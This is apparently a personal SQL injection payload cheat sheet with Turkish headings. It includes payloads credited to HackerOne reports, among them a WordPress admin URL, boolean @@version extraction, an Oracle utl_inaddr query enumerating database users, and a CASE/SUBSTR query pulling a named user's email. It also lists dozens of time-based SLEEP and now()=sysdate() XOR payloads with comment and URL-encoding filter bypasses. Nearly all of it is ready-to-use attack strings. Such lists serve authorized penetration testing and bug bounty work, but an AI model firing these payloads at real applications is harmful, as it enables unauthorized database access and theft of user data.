## Real Life from hacker one

```html
/wp-admin/admin.php?page= search

FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)-- YFDA&compact=t
"1 and (select substring(@@version,1,1))='M'" - true
"1 and (select substring(@@version,2,1))='i'" - true
"1 and (select substring(@@version,3,1))='c'" - true
"1 and (select substring(@@version,22,1))='2'"
"1 and (select substring(@@version,23,1))='0'"
"1 and (select substring(@@version,24,1))='0'"
"1 and (select substring(@@version,25,1))='8'"

or 1=utl_inaddr.get_host_address((select sys.stragg (distinct username||chr(32)) from all_users))--

%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29
51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
')+union+select+1,sleep(10)--+-
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
" AND (length(database())) = "11 --+-    
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79
```

# sqli functions

```jsx
' OR '1' ='1

```

**Temel Sleep Fonksiyonları**

```sql

' AND ExtractValue(1, CONCAT(0x3a,    (SELECT version()) ))--
	 
'XOR(if(now()=sysdate(),sleep(5*6),0))OR'

')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/#

1-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)'

%2b(select*from(select(sleep(20)))a)%2b

%2c(select%5*%5from%5(select(sleep(5)))a)
```

```sql
0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
if(now()=sysdate(),sleep(5),0)
'XOR(if(now()=sysdate(),sleep(5),0))XOR'
'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
```

**Karışık Syntax Varyasyonları**

```sql
if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/>
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
```

**Doğrudan SLEEP Fonksiyonu**

```sql
SLEEP(5)/*' or SLEEP(5) or '" or SLEEP(5) or "*/
%2c(select%5*%5from%5(select(sleep(5)))a)
(select(0)from(select(sleep(5))))v)
(SELECT SLEEP(5))
```

**Subquery ile Sleep**

```sql
'%2b(select*from(select(sleep(5)))a)%2b'
(select*from(select(sleep(5)))a)
1'%2b(select*from(select(sleep(5)))a)%2b'
,{select * from (select(sleep(5)))a)
desc%2c(select*from(select(sleep(5)))a)
```

**Farklı Operatör ve Syntax Denemeleri**

```sql
-1+0T+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
-1+0T+1=(SELECT+1+FROM+(SELECT+SLEEP(5))A))
(SELECT * FROM (SELECT(SLEEP(5))))YYYY)
(SELECT * FROM (SELECT(SLEEP(5))))YYYY)#
(SELECT * FROM (SELECT(SLEEP(5))))YYYY)-
```

**URL Encoding ve Özel Karakterler**

```sql

(select(0)from(select(sleep(5))))v)%2f'
(select(0)from(select(sleep(5))))v)+'"
(select(0)from(select(sleep(5))))v)%2f*'
```

**Yorum Satırı ve Operatör Bypass'ları**

```sql
(select(0)from(select(sleep(5))))v)+'"
(select(0)from(select(sleep(5))))v)+'"
(select(0)from(select(sleep(5))))v)+"*%2f
(select(0)from(select(sleep(5))))v)/*'+
(select(0)from(select(sleep(5))))v)+'"
(select(0)from(select(sleep(5))))v)+'"
',',''),/*test*/%26%26%09sLEEP(5)%09-
```
